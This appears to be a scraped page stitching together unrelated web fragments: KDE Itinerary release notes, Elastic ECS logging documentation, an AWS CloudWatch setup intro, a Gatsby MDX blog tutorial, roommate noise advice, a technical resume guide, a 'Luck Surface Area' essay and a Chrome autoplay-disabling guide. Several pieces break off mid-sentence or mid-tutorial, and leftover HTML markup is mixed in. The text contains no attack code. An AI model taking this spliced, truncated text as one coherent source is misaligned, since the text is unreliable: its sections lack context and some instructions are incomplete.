maintenance load with more people, and gaining support for more transport operators. The improved
coverage metadata might also allow us to implement a much more efficient way of doing a global
name-based location search.</p>

<p>Another thing we did to support data improvements benefiting our applications are the
<a href="https://www.volkerkrause.eu/2021/01/16/kde-osm-indoor-map-demo-app.html">nightly Flatpak and Android builds of the standalone KOSMIndoorMap demo app</a>,
which should help with reviewing OSM indoor map data.</p>

<h3 id="fixes--improvements">Fixes &amp; Improvements</h3>

<p>There’s plenty of smaller but still noteworthy changes too of course, all over the place.</p>



<ul>
  <li>Improved or new extractor scripts for Accor and Agoda hotel reservations, as well as some SNCF TER ticket variants.</li>
  <li>Migrated to a new barcode reader API in collaboration with the <a href="https://github.com/nu-book/zxing-cpp/">ZXing</a> developers.
This simplifies our code as it provides proper support for input from “pure” sources (e.g. perfect black/white graphics rather than
say blurry camera images), and gives us better performance.</li>
</ul>

<h4 id="train-station-maps">Train station maps</h4>

<ul>
  <li>Distinguish between dock-based and floating rental bikes.</li>
  <li>Fix rendering of multi-polygons with multiple adjacent outer polygons. This previously resulted
in bizarre glitches in complex buildings like the Frankfurt airport railway station or some of Paris Charles de Gaulle’s terminals.</li>
  <li>Fix railway platform edges and airport taxiways being misrendered when having certain unnecessary OSM tags.</li>
  <li>Make the element information dialog accessible for interactive elements like stairs, elevators or escalators as well
via a long-press action.</li>
</ul>

<h4 id="itinerary-app">Itinerary app</h4>

<ul>
  <li>Fixed a large number of layouting and resizing glitches all over the place.</li>
  <li>Fixed a few page routing issues impacting desktop users.</li>
  <li>Allow to open an external map application from within the indoor map view, in case you want to see the surrounding area too.</li>
  <li>Fixed timeline display for events without an associated location.</li>
  <li>Network status monitoring now also works within a Flatpak, fixing automatic map download there.</li>
  <li>Fixed timelines entries being wrongly calculated when occurring close toa day boundary.</li>
  <li>Fixed a rounding error in the sun position math in KF5::Holidays that would result in the sun not rising
if you found yourself in the wrong place at the wrong time.</li>
  <li>Fixed determining of arrival/departure platforms for multi-section transfers.</li>
  <li>Fixed opening the indoor map view for timeline elements that aren’t location changes (such as accommodation or events).</li>
</ul>

<h3 id="contribute">Contribute</h3>

<p>While field testing and collecting travel document samples remains difficult in many parts of the world, there’s plenty
of other things that can be done. The <a href="https://phabricator.kde.org/project/view/280/">KDE Itinerary workboard</a> or the
more specialized <a href="https://invent.kde.org/libraries/kpublictransport/-/boards/1930">indoor map workboard</a> show
what’s on the todo list, and are a good place for collecting new ideas. For questions and suggestions, please feel free
to join us on <a href="https://mail.kde.org/mailman/listinfo/kde-pim">the KDE PIM mailing list</a> or in the <code>#kontact</code> channel on Matrix or Freenode,
or meet us next week at <a href="https://fosdem.org/2021/">FOSDEM 2021</a>!</p>

<p>Elastic Common Schema (ECS) defines a common set of fields for ingesting data into Elasticsearch.

<p>ECS loggers are plugins for your favorite logging library.
They make it easy to format your logs into ECS-compatible JSON. For example:</p>
<div>
<pre>{"@timestamp":"2019-08-06T12:09:12.375Z", "log.level": "INFO", "message":"Tomcat started on port(s): 8080 (http) with context path ''", "service.name":"spring-petclinic","process.thread.name":"restartedMain","log.logger":"org.springframework.boot.web.embedded.tomcat.TomcatWebServer"}
{"@timestamp":"2019-08-06T12:09:12.379Z", "log.level": "INFO", "message":"Started PetClinicApplication in 7.095 seconds (JVM running for 9.082)", "service.name":"spring-petclinic","process.thread.name":"restartedMain","log.logger":"org.springframework.samples.petclinic.PetClinicApplication"}
{"@timestamp":"2019-08-06T14:08:40.199Z", "log.level":"DEBUG", "message":"init find form", "service.name":"spring-petclinic","process.thread.name":"http-nio-8080-exec-8","log.logger":"org.springframework.samples.petclinic.owner.OwnerController","transaction.id":"28b7fb8d5aba51f1","trace.id":"2869b25b5469590610fea49ac04af7da"}</pre>

<p>We recommend shipping the logs with Filebeat.
Depending on the way the application is deployed, you may log to a log file or to stdout (for example in Kubernetes).</p>
<p>Here are a few benefits to over directly sending logs from the application to Elasticsearch:</p>
<div>
<dl>
<dt>
<span>
<span><strong>Resilient in case of outages</strong></span>
</span>

<dd>
<p><a href="https://www.elastic.co/guide/en/beats/filebeat/7.10/how-filebeat-works.html#at-least-once-delivery" target="_top">Guaranteed at-least-once delivery</a>
without buffering within the application, thus no risk of out of memory errors or lost events.
There’s also the option to use either the JSON logs or plain-text logs as a fallback.</p>
</dd>
<dt>
<span>
<span><strong>Loose coupling</strong></span>
</span>
</dt>
<dd>
<p>The application does not need to know the details of the logging backend (URI, credentials, etc.).
You can also leverage alternative <a href="https://www.elastic.co/guide/en/beats/filebeat/7.10/configuring-output.html" target="_top">Filebeat outputs</a>,
like Logstash, Kafka or Redis.</p>
</dd>

</dt>
<dd>
<p>Leverage Filebeat’s default <a href="https://www.elastic.co/guide/en/beats/filebeat/7.10/ilm.html" target="_top">index lifecycle management settings</a>.
This is much more efficient than using daily indices.</p>

<h4><a id="_configurable_fields"></a>Configurable fields<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h4>
<p>Refer to the documentation of the individual loggers on how to set these fields.</p>

<h4><a id="_custom_fields"></a>Custom fields<a rel="nofollow" title="Edit this page on GitHub" href="https://github.com/elastic/ecs-logging/edit/master/docs/intro.asciidoc">edit</a></h4>
<p>Most loggers allow you to add additional custom fields.
This includes both, static and dynamic ones.
Examples for dynamic fields are logging structured objects,
or fields from a thread local context, such as <code>MDC</code> or <code>ThreadContext</code>.</p>
<p>When adding custom fields, we recommend using existing <a href="https://www.elastic.co/guide/en/ecs/1.6/ecs-field-reference.html" target="_top">ECS fields</a> for these custom values.
If there is no appropriate ECS field,
consider prefixing your fields with <code>labels.</code>, as in <code>labels.foo</code>, for simple key/value pairs.
For nested structures, consider prefixing with <code>custom.</code>.
This approach protects against conflicts in case ECS later adds the same fields but with a different mapping.</p>

  <p>Emile Nijssen's Blog</p>

  
  
<p>By default AWS Elastic Beanstalk only monitors CPU, Network, etc. but no in-machine statistics such as the amounf of free memory and disk space usage.</p>
<p>Their <a href="https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/customize-containers-cw.html">tutorial</a> uses a CloudWatch Agent, but this only tags the instance ID (e.g. <code>i-12345</code>), which is very useless if you want to monitor in Grafana. What I want to see is the environment name (e.g. <code>myapp-prod</code>).</p>
<p>This solution uses a CloudWatch Agent to save metrics to CloudWatch as well, but tags all metrics with the environment name.</p>
<h2 id="1-setup-aws-elastic-beanstalk">1. Setup AWS Elastic Beanstalk</h2>
<p>Save this file as <code>/.ebextensions/cloudwatch.config</code> to automatically monitor and tag these into CloudWatch. You can then easily import those into Grafana (or the tool of your liking).</p>

(bash, zsh or fish) and a text editor.</p><p>I do like to use <a href="https://codesandbox.io/" target="_blank" rel="noopener">codesandbox.io</a> for these sort of guides to reduce
the barrier to entry but in this case I have found there are some
limitations with starting out from scratch on <a href="https://codesandbox.io/" target="_blank" rel="noopener">codesandbox.io</a> which
doesn’t make this possible.</p><p>I have made a guide on getting set up for web development with
<a href="http://scottspence.com/2018/12/24/wsl-bootstrap-2019/" target="_blank" rel="noopener">Windows Web-Dev Bootstrap</a> and covered the same process in <a href="https://www.youtube.com/watch?v=eSAsdQuQ-1o" target="_blank" rel="noopener">Ubuntu as
well</a>.</p><p>Ok? Time to get started!</p><h2 id="hello-world"><a href="#hello-world" aria-label="hello world permalink"></a>Hello World</h2><p>Kick this off with the Gatsby ‘hello world’, you’ll need to initialise
the project with:</p><p>I suggest that you commit this code to a git repository, so you should
start with a <code>.gitignore</code> file.</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span>touch</span><span> .gitignore</span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>echo</span><span> </span><span>"# Project dependencies</span></p><p><span>4</span><span>.cache</span></p><p><span>5</span><span>node_modules</span></p><p><span>6</span><span></span></p><p><span>7</span><span># Build directory</span></p><p><span>8</span><span>public</span></p><p><span>9</span><span></span></p><p><span>10</span><span># Other</span></p><p><span>11</span><span>.DS_Store</span></p><p><span>12</span><span>yarn-error.log"</span><span> </span><span>&gt;</span><span> .gitignore</span></p></pre></div></div><p>Ok now is a good time to do a <code>git init</code> and if you’re using VSCode
you’ll see the changes reflected in the sidebar.</p><h3 id="basic-hello-world"><a href="#basic-hello-world" aria-label="basic hello world permalink"></a>basic hello world</h3><p>Ok a Gatsby hello world, get started with the bare minimum! Install
the following:</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span>yarn</span><span> </span><span>add</span><span> gatsby react react-dom</span></p></pre></div></div><p>You’re going to need to create a pages directory and add an index
file. You can do that in the terminal by typing the following:</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span></span></p><p><span>2</span><span></span><span>mkdir</span><span> -p src/pages</span></p><p><span>3</span><span></span><span>touch</span><span> src/pages/index.js</span></p></pre></div></div><p>Ok, now you can commence the hello word incantation! In the newly
created <code>index.js</code> enter the following:</p><div><div data-language="jsx"><pre data-linenumber="true"><p><span>1</span><span>import</span><span> React </span><span>from</span><span> </span><span>'react'</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>export</span><span> </span><span>default</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>  </span><span>return</span><span> </span><span>&lt;</span><span>h1</span><span>&gt;</span><span>Hello World</span><span>!</span><span>&lt;/</span><span>h1</span><span>&gt;</span><span></span></p><p><span>5</span><span></span><span>}</span></p></pre></div></div><p>Now you need to add the Gatsby develop script to the <code>package.json</code>
file, <code>-p</code> specifies what port you want to run the project on and <code>-o</code>
opens a new tab on your default browser, so in this case
<code>localhost:9988</code>:</p><div><div data-language="json"><pre data-linenumber="true"><p><span>1</span><span>"dev"</span><span>:</span><span> </span><span>"gatsby develop -p 9988 -o"</span></p></pre></div></div><p>Ok it’s time to run the code! From the terminal type the npm script
command you just created:</p><blockquote><p>Note I’m using Yarn for installing all my dependencies and running
scripts, if you prefer you can use npm just bear in mind that the
content on here uses yarn, so swap out commands where needed</p></blockquote><p>And with that the “Hello World” incantation is complete 🧙!</p><h2 id="add-content"><a href="#add-content" aria-label="add content permalink"></a>Add content</h2><p>Ok, now you have the base your blog you’re going to want to add some
content, first up we’re going to get the convention out of the way.
For this how-to, the date format will be a logical way, the most
logical way for a date format is <strong>YYYYMMDD</strong>, fight me!</p><p>So you’re going to structure your posts content in years, in each one
of those you’re going to have another folder relating to the post with
the (correct) date format for the beginning of the file followed by
the title of the post. You could drill into this further if you like
by separating out months and days depending on the volume of posts
going this may be a good approach. In this case and in the examples
provided the convention detailed will be used.</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span></span></p><p><span>2</span><span></span><span>mkdir</span><span> -p posts/2019/</span><span>{</span><span>2019</span><span>-06-01-hello-world,2019-06-10-second-post,2019-06-20-third-post</span><span>}</span><span></span></p><p><span>3</span><span></span><span>touch</span><span> posts/2019/2019-06-01-hello-world/index.mdx</span></p><p><span>4</span><span></span><span>touch</span><span> posts/2019/2019-06-10-second-post/index.mdx</span></p><p><span>5</span><span></span><span>touch</span><span> posts/2019/2019-06-20-third-post/index.mdx</span></p></pre></div></div><p>Ok that’s your posts set up now you need to add some content to them,
each file you have in here should have frontmatter. Frontmatter is a
way to assign properties to the contents, in this case a <code>title</code>,
published <code>date</code> and a <code>published</code> flag (<code>true</code> or <code>false</code>).</p><div><div data-language="md"><pre data-linenumber="true"><p><span>1</span><span>---</span><span></span></p><p><span>2</span><span>title: Hello World - from mdx!</span></p><p><span>3</span><span>date: 2019-06-01</span></p><p><span>4</span><span></span><span>published: true</span></p><p><span>5</span><span></span><span>---</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span></span><span>#</span><span> h1 Heading</span><span></span></p><p><span>8</span><span></span></p><p><span>9</span><span>My first post!!</span></p><p><span>10</span><span></span></p><p><span>11</span><span></span><span>##</span><span> h2 Heading</span><span></span></p><p><span>12</span><span></span></p><p><span>13</span><span></span><span>###</span><span> h3 Heading</span></p></pre></div></div><div><div data-language="md"><pre data-linenumber="true"><p><span>1</span><span>---</span><span></span></p><p><span>2</span><span>title: Second Post!</span></p><p><span>3</span><span>date: 2019-06-10</span></p><p><span>4</span><span></span><span>published: true</span></p><p><span>5</span><span></span><span>---</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span>This is my second post!</span></p><p><span>8</span><span></span></p><p><span>9</span><span></span><span>####</span><span> h4 Heading</span><span></span></p><p><span>10</span><span></span></p><p><span>11</span><span></span><span>#####</span><span> h5 Heading</span><span></span></p><p><span>12</span><span></span></p><p><span>13</span><span></span><span>######</span><span> h6 Heading</span></p></pre></div></div><div><div data-language="md"><pre data-linenumber="true"><p><span>1</span><span>---</span><span></span></p><p><span>2</span><span>title: Third Post!</span></p><p><span>3</span><span>date: 2019-06-20</span></p><p><span>4</span><span></span><span>published: true</span></p><p><span>5</span><span></span><span>---</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span>This is my third post!</span></p><p><span>8</span><span></span></p><p><span>9</span><span></span><span>&gt;</span><span> with a block quote!</span></p></pre></div></div><h2 id="gatsby-config-api"><a href="#gatsby-config-api" aria-label="gatsby config api permalink"></a>Gatsby config API</h2><p>Ok, now you’re going to configure Gatsby so that it can read your
super awesome content you just created. So, first up you need to
create a <code>gatsby-config.js</code> file, in the terminal create the file:</p><h2 id="plugins"><a href="#plugins" aria-label="plugins permalink"></a>Plugins</h2><p>And now you can add the plugins Gatsby needs to use for sourcing and
displaying the the files you just created.</p><h3 id="gatsby-source-filesystem"><a href="#gatsby-source-filesystem" aria-label="gatsby source filesystem permalink"></a>Gatsby source filesystem</h3><p>The <a href="https://www.gatsbyjs.org/packages/gatsby-source-filesystem/" target="_blank" rel="noopener">gatsby-source-filesystem</a> collects the files on the local

our Markdown documents and the heart of how the content is displayed
in the blog.</p><p>Now is a good time to also add in dependent packages for the Gatsby
plugin MDX which are <code>@mdx-js/mdx</code> and <code>@mdx-js/react</code>.</p><p>In the terminal install the dependencies:</p><div><div data-language="bash"><pre data-linenumber="true"><p><span>1</span><span>yarn</span><span> </span><span>add</span><span> gatsby-plugin-mdx @mdx-js/mdx @mdx-js/react gatsby-source-filesystem</span></p></pre></div></div><p>Now its time to configure <code>gatsby-config.js</code>:</p><div><div data-language="js"><pre data-linenumber="true"><p><span>1</span><span>module</span><span>.</span><span>exports</span><span> </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  siteMetadata</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>    title</span><span>:</span><span> </span><span>`</span><span>The Localhost Blog</span><span>`</span><span>,</span><span></span></p><p><span>4</span><span>    description</span><span>:</span><span> </span><span>`</span><span>This is my coding blog where I write about my coding journey.</span><span>`</span><span>,</span><span></span></p><p><span>5</span><span>  </span><span>}</span><span>,</span><span></span></p><p><span>6</span><span>  plugins</span><span>:</span><span> </span><span>[</span><span></span></p><p><span>7</span><span>    </span><span>{</span><span></span></p><p><span>8</span><span>      resolve</span><span>:</span><span> </span><span>`</span><span>gatsby-plugin-mdx</span><span>`</span><span>,</span><span></span></p><p><span>9</span><span>      options</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>10</span><span>        extensions</span><span>:</span><span> </span><span>[</span><span>`</span><span>.mdx</span><span>`</span><span>,</span><span> </span><span>`</span><span>.md</span><span>`</span><span>]</span><span>,</span><span></span></p><p><span>11</span><span>      </span><span>}</span><span>,</span><span></span></p><p><span>12</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>13</span><span>    </span><span>{</span><span></span></p><p><span>14</span><span>      resolve</span><span>:</span><span> </span><span>`</span><span>gatsby-source-filesystem</span><span>`</span><span>,</span><span></span></p><p><span>15</span><span>      options</span><span>:</span><span> </span><span>{</span><span></span></p><p><span>16</span><span>        path</span><span>:</span><span> </span><span>`</span><span>${</span><span>__dirname</span><span>}</span><span>/posts</span><span>`</span><span>,</span><span></span></p><p><span>17</span><span>        name</span><span>:</span><span> </span><span>`</span><span>posts</span><span>`</span><span>,</span><span></span></p><p><span>18</span><span>      </span><span>}</span><span>,</span><span></span></p><p><span>19</span><span>    </span><span>}</span><span>,</span><span></span></p><p><span>20</span><span>  </span><span>]</span><span>,</span><span></span></p><p><span>21</span><span></span><span>}</span></p></pre></div></div><h2 id="query-data-from-graphql"><a href="#query-data-from-graphql" aria-label="query data from graphql permalink"></a>Query data from GraphQL</h2><p>Ok now you can see what the <a href="https://www.gatsbyjs.org/packages/gatsby-source-filesystem/" target="_blank" rel="noopener">gatsby-source-filesystem</a> and
<a href="https://www.gatsbyjs.org/packages/gatsby-plugin-mdx/" target="_blank" rel="noopener">gatsby-plugin-mdx</a> have done for us. You can now go to the Gatsby

example, your site title), you can store that data in <code>siteMetadata</code>,
you touched on this when defining the <code>gatsby-config.js</code>, now you’re
going to separate this out from the <code>module.exports</code>, why? It will be
nicer to reason about once the config is filled with plugins. At the
top of <code>gatsby-config.js</code> add a new object variable for the site
metadata:</p><div><div data-language="js"><pre data-linenumber="true"><p><span>1</span><span>const</span><span> siteMetadata </span><span>=</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  title</span><span>:</span><span> </span><span>`</span><span>The Localhost Blog</span><span>`</span><span>,</span><span></span></p><p><span>3</span><span>  description</span><span>:</span><span> </span><span>`</span><span>This is my coding blog where I write about my coding journey.</span><span>`</span><span>,</span><span></span></p><p><span>4</span><span></span><span>}</span></p></pre></div></div><p>Now query the Site Metadata with GraphQL.</p><div><div data-language="graphql"><pre data-linenumber="true"><p><span>1</span><span>{</span><span></span></p><p><span>2</span><span>  site </span><span>{</span><span></span></p><p><span>3</span><span>    siteMetadata </span><span>{</span><span></span></p><p><span>4</span><span>      title</span></p><p><span>5</span><span>      description</span></p><p><span>6</span><span>    </span><span>}</span><span></span></p><p><span>7</span><span>  </span><span>}</span><span></span></p><p><span>8</span><span></span><span>}</span></p></pre></div></div><h2 id="site-metadata-hook"><a href="#site-metadata-hook" aria-label="site metadata hook permalink"></a>Site metadata hook</h2><p>Ok, so, that’s cool n’ all but how am I meant to use it?

of the code stuff and make a React hook so you can get your site data
in any component you need it.</p><p>Create a folder to keep all your hooks in and create a file for our

          <div>
            <!-- Article body -->
            <article>
              <h5>
                Do you get annoyed every time your roommate slams the doors?
                Does it wake you up every morning? How can you avoid this?
              </h5>
              <h3>First thing to do</h3>
              <p>
                 Try to talk with your roommate and explain to him that this bothers you.
                 Talk to him without tension and in a clear and calm way. It is
                 recommended to catch your roommate in a good mood. if he is sad
                 or has had a hard day he is more likely to take the problem more personally
                 and not understand that it is actually a small thing that bothers you.
                 If you are different in personality, take a step back and try to take it
                as nicely as possible and explain it without getting upset. He may not know
                that he is doing this and he will realize that it is an annoying thing that
                he is not consciously doing.
              </p>
              <p>
                <i></i>Try to avoid phrases like:
              </p>
              <ul>
                <li>It is very annoying that you are slamming the door!</li>
                <li>if I woke you up every day knocking on the door, would you like it !?</li>
                <li>I don't know how you can slam the doors like that!</li>
              </ul>

              <p>
                 <i></i> Try to approach your roommate with a phrase like:
              </p>

              <blockquote>
                <p>
                  Hi! I had such a hard day, how was yours?
                  I know you woke up at 6 that I heard when you closed the door.
                  I thought it sounded really loud and I woke up instantly.
                  Maybe we should put some sticky pads on the furniture to make it
                  less noisy or trying to close it more carefully not to wake up each other.
                </p>
              </blockquote>

              <h3>Other ways to prevent noise are:</h3>
              <ol>
                <li>
                  Try sticky furniture pads
                  <br>
                  - not completely, but it will dampen the sound
                  <br>
                  - <a href="https://www.amazon.com/Self-Adhesive-Furniture-Cupboard-Dampening-Anti-Slam/dp/B07NV14R51" target="
                  " rel="nofollow">here</a> is a model of what it should look like
                </li>
                <li>
                  Make a set of rules from the beginning that includes 'don't slam the doors' and stick the paper it on the main wall
                  <br>
                  - The advantage of this is that you can't get upset on a paper that has some rules. ‘Don’t slam the doors’ from a human being may sound annoying but reading it will not bother you
                </li>
                <li>
                  Install a door closer
                  <br>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><p>The purpose of your technical resume is to generate interview requests. A successful resume attracts more interest, from more of the companies you want to interview with, for more of the jobs you would be happy to take.</p><p>You might think of a resume as your personal summary document, covering all of your life’s work to date. But it’s better to think of your resume as a business document that helps you advertise your capabilities to a future employer.</p><p>I’ve worked with thousands of employers, published the <a href="https://www.businessinsider.com/heres-what-recruiters-look-at-during-the-6-seconds-they-spend-on-your-resume-2012-4">ground-breaking research</a> into recruiter resume review time, and written several bestsellers on resumes and other career topics. And that’s why I’m now writing <a href="https://signup.meetleet.com/">great technical resumes for free</a>. Resumes, when done right, are great help in accelerating your career.</p><p>Here are a few things a <a href="https://leetresumes.com/blog/leet-resumes-technical-resume-documentation">technical resume</a> is not:</p><ul><li>Not your autobiography</li><li>Not a comprehensive catalog of everything you’ve done</li><li>Not a way to make you feel good about yourself (though it might also do that)</li><li>Not an academic CV</li><li>Not where you need to explain past ‘bad situations’</li><li>Not where you need to explain why you left prior jobs</li></ul><p>No, a technical resume is none of those things. And that’s because none of those things help get you hired.</p><p>Instead, a technical resume’s primary purpose is to generate interview requests for you. It’s where you make the case to “please pick me out of the pile.”</p><p>(Secondarily, a resume is a useful page of notes to use during interviews, especially behavioral interviews. We all know how our minds can go blank during interviews and it’s useful to have something to aid your memory in those moments.)</p><p>What’s the best way to get a hiring manager or future boss to select your resume from the pile? </p><p>It’s to make it as clear as possible which types of problems you’ve solved in the past, and how well you solved them. With that information, hiring managers have the easiest time in predicting what you can do for them in the future.</p><p>Unfortunately, most technology professionals take the easy way out, and copy and paste their job description into their resume. As a result, their <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">bullet points</a> are full of sentences that begin “Responsible for” or “Worked on” or “Assigned to.”</p><p>This is a mistake because your future employer is not going to hire you for your past <strong>responsibilities</strong>. Rather, they will hire you for your past <strong>successes</strong>. It’s your achievements and results in technology that get you promoted and elevated to ever-higher levels.</p><p>And that’s why great technical resumes focus on results, <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">numbers</a> and method. </p><p><strong>Results</strong>: for the technology you were working on, how did it make your company, team, or systems better? Did it increase, decrease, grow, shrink, improve, suppress, optimize, deprecate, add or remove something important for your company? For everything you’ve worked on, there was some reason you were doing it. Hopefully, that reason had to do with making things better. Share the result with your resume readers. </p><p><strong>Numbers</strong>: by how much did you make things better? As a technology professional, you’re used to numbers. We measure the success of what we do in numbers all the time: latency, loadtime, DAUs, Google score. Using numbers to describe the work you’ve done comes naturally in the field.</p><p>So the more you can use numbers to <strong>quantify</strong> how much you helped increase, decrease, grow, shrink, etc., the important metrics in your prior roles, the better and more persuasive your resume will be in getting picked out of the pile. </p><p><strong>Method</strong>: this is the technical “how I did it” part of a great technical resume. If you increased something by 50% what technologies or solutions or methodologies did you use to get there? If you shrank a different metric by 70%, what activities or behaviors or actions did you need to take to achieve this reduction?</p><p>Many technical resumes miss the results and the numbers and only list the method of how they did something. Unfortunately, that’s not as effective at attracting attention to get your resume picked out of the pile.</p><p>To demonstrate, the <a href="https://www.meetleet.com/blog/how-to-write-bullet-points-for-a-technical-resume">bullet points</a> below <strong>with</strong> <a href="https://www.meetleet.com/blog/why-you-should-include-numbers-on-your-technical-resume">numbers</a> are much more powerful than the same bullet point <strong>without</strong> numbers.</p><ul><li>Responsible for for managing our AWS cloud services for cost, reliability and scalability.</li><li>Reduced costs 17% by decommissioning 42 ec2 instances in our AWS implementation while managing for costs, reliability and scalability.</li></ul><ul><li>Worked on cloud backend </li><li>Architected cloud backend to support scaling from 50,000 to 1.5 million daily users.</li></ul><ul><li>Refactored our front/end experience using React.</li><li>Reduced average page load time 57% by refactoring our front-end experience in React.</li></ul><ul><li>Improved rendering system for complex graphical objects.</li><li>Improved the performance of rendering system for complex graphical objects from 10,000 to 1,000,000 objects per second with only 20% increase in resource utilization. </li></ul><p>Combining results, numbers and methods on your resume makes your experience stand out from the pile. And that’s the <a href="https://leetresumes.com/blog/leet-resumes-technical-resume-documentation">best way</a> to fulfill the purpose of your resume - to get you interview requests.</p><p><a href="https://www.meetleet.com/blog/how-to-write-a-great-technical-resume">Great technical resumes</a> increase your chances of getting hired, and getting ahead in your career.

<p>
"Luck Surface Area" is a turn of phrase that popped out my mouth during a discussion
episode of <a href="http://www.techzinglive.com/">TechZing</a> a few months back and
is something I've been meaning to write
about ever since but never got around to actually doing. However, thanks to
<a href="http://page99test.wordpress.com/about/">Lance Jones</a>
who referenced the concept in a recent <a href="http://page99test.wordpress.com/2010/11/07/making-the-front-page-of-hn-without-even-trying/">blog post</a> I have finally been spurred into
action.
</p>
<p>
If there's one thing I've discovered in recent years it's this. The amount of
serendipity that will occur in your life, your Luck Surface Area, is directly
proportional to the degree to which you do something you're passionate about
combined with the total number of people to whom this is effectively communicated.
It's a simple concept, but an extremely powerful one because what it implies is
that you can directly control the amount of luck you receive. In other words,
you make your own luck.
</p>
<p>
Here's how it works. When you pour energy into a passion, you develop an expertise
and an expertise of any kind is valuable. But quite often that value can actually
be magnified by the number people who are made aware of it. The reason is that
when people become aware of your expertise, some percentage of them will take
action to capture that value, but quite often it will be in a way you would never
have predicted. Maybe they'll want to hire you, or partner with you, or invest in
you, or who knows what. But in whatever way it happens, it will be serendipitous.
</p>
<p>
But it's not just the expertise that's important, the very passion that created
the expertise has value in its own right. This is because people want to be excited
about things and passion is infectious. When you do something you're excited about
you will naturally pull others into your orbit. And the more people with whom you
share your passion, the more who will be pulled into your orbit.
</p>
<p>
To satisfy my mathematically oriented brain I've gone one step further and formalized
the concept into the equation L = D * T, where L is luck, D is doing and T is telling.
This demonstrates clearly that the more you do and the more people you tell about it,
the larger your Luck Surface Area will become. And while I like equations, it's the
graphical representation that really brings the concept home.
</p>

<p>Does it seem like Chrome used to do a better job at NOT automatically playing video?  Having problems with unmuted video or audio automatically playing when you visit certain sites?  Have you gone looking for the old autoplay settings only to discover they’re not in Chrome at all anymore? </p>



<p>You are not alone.  In this post, we will first tell you how to fix it, then if you’re interested, keep reading for details about the changes made in Chrome, why they suck, and how we figured out how to disable them.  That way, when they change things again, you’ll be able to work out how to handle it.  </p>



<h2>The Solution:</h2>



<p>For Windows, right-click on the icon you click on to start Chrome.  If this is on the taskbar on Windows 10, right-click on the taskbar icon, then move up to <em>Google Chrome</em> and right-click on that as well.  Then click on Properties, this will open the <em>Google Chrome Propertie</em>s dialog.</p>



<p>In the <em>Target</em> field, you should see this:</p>



<pre><code><code>"c:\Program Files\Google\Chrome\Application\chrome.exe"</code> </code></pre>



<p>Click to edit the <em>Target</em> field, Ctrl-A to select everything, hit Backspace to delete it all, and paste the following:</p>



<pre><code>"c:\Program Files\Google\Chrome\Application\chrome.exe" --disable-features=PreloadMediaEngagementData,MediaEngagementBypassAutoplayPolicies,RecordMediaEngagementScores,RecordWebAudioEngagement</code></pre>



<p>Click Apply, Click OK, and you’re done.</p>



<p>For Linux/OSX, the solution is the same. Find the icon you’re clicking on to start Chrome, edit the properties, and add the same command line flags after the location of the Chrome binary:</p>



<pre><code>--disable-features=PreloadMediaEngagementData,MediaEngagementBypassAutoplayPolicies,RecordMediaEngagementScores,RecordWebAudioEngagement</code></pre>



<p>That’s it.  Restart Chrome and you should have the old behavior back.  Videos might still autoplay on some sites, but they should always be muted until you click on them. </p>



<p>You make sure that it’s off if the <a href="https://media-engagement/" target="_blank" rel="noreferrer noopener">chrome://media-engagement/</a> link stops working!  Without this fix, that link will show your current Media Engagement settings and what data has been logged.</p>



<h3>What changed?  Why does this fix work?</h3>



<p>Back in version 62 of Chrome, they added a feature they called Media Engagement Index (MEI), which keeps a log of how many times you actually click on video and audio on various sites.  Once you’ve actually clicked on a video on a site a certain number of times, it AUTOMATICALLY DISABLES AUTOPLAY PROTECTIONS for that site.  What’s worse than that, they preload a list of sites that get a free bypass of autoplay protections, which includes many porn sites.  </p>



<p>Deciding that they did such a good job with this feature, they then proceeded to remove the autoplay settings from the interface in the browser. </p>



<p>Kind of shitty behavior.  I guess they never figured that people might want autoplay disabled all the time, even on sites they use frequently or even on the magical list of sites that Google decided get a free pass.  Maybe they were just trying to get more people to accidentally blast the audio from porn sites?  Otherwise I’m not sure why anyone thought this was a good idea.  </p>



<p>Fortunately, you can still disable these features from the command line using the <em>–disable-features</em> flag. </p>



<p>Our recommended fix disables four features, which restore the old autoplay behavior, disable the preloaded bypass list, and completely disable the extra tracking of your media consumption:</p>



<p><strong>PreloadMediaEngagementData </strong>–  Disabling this feature will disable the list of sites that Google has pre-determined should be able to bypass autoplay protections.</p>



<p><strong>MediaEngagementBypassAutoplayPolicies </strong>– Disabling this feature disallows sites that you use regularly to bypass autoplay protections.</p>



<p><strong>RecordMediaEngagementScores </strong>– Disabling this feature turns off the Media Engagement tracking altogether.  </p>



<p><strong>RecordWebAudioEngagement </strong>– Disabling this feature turns off the Media Engagement tracking for web audio.</p>



<p>Try enabling and disabling those features individually if you want to further tune this behavior.</p>



<h3>Don’t Take Our Word For It – Look at the Code!</h3>



<p>You can search the Chromium source code here: <a href="https://source.chromium.org/chromium" target="_blank" rel="noreferrer noopener">https://source.chromium.org/chromium</a></p>



<p>This can show you all the other features you might want to disable or enable from the command line.  For example, searching for one of our flags, <em>PreloadMediaEngagementData</em>, brings us to a file called <a href="https://source.chromium.org/chromium/chromium/src/+/master:media/base/media_switches.cc;l=744?q=PreloadMediaEngagementData%20&amp;ss=chromium" target="_blank" rel="noreferrer noopener">media_switches.cc</a> in the Chrome source.  This is how we found the flags to disable the whole MEI system, and there are many other feature flags in there you might want to play with.</p>



